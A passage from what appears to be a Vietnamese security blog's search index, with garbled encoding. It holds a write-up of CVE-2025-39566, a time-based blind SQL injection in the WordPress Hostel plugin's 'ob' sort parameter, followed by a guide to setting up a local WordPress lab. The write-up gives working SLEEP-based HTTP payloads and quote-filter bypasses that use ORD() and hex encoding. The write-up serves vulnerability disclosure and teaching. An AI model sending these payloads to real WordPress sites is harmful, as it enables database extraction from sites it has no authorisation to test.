file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: 